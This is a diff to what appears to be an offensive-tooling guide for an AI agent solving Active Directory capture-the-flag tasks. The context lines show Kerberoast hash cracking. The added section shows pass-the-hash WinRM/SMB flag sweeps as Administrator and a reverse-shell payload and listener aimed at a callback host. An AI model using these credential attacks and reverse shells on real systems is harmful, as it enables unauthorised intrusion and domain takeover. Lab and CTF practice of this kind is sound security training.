@@ -122,3 +122,17 @@ ADTK_WORDLIST=~/wordlists/rockyou.txt \
   scripts/host-crack.sh --mode 13100 --hash ./kerb.txt --budget 300 --background
 # → prints user:pass, writes kerb.txt.cracked; keep enumerating meanwhile
 ```
+
+## Go fast: grab the flag in one call, not a dozen
+
+Owned a host and just need the CTF flag? Don't loop `atexec 'type flag.txt'` —
+each call is an MCP round-trip (tokens). One WinRM sweep of every flag location:
+
+```bash
+/opt/adtk/revshell.sh flags {{DC}} -u Administrator -H {{HASH}} -d {{DOMAIN}}
+/opt/adtk/revshell.sh flags {{DC}} -u Administrator -H {{HASH}} --exec smb   # 5985 closed
+```
+
+Need interactive? `revshell.sh payload {{LHOST}} 4444 ps` to print a payload,
+fire it with your exec channel, catch with `revshell.sh listen 4444` — but in a
+tty (`docker exec -it`), never held open over MCP. See `tools/revshell.md`.
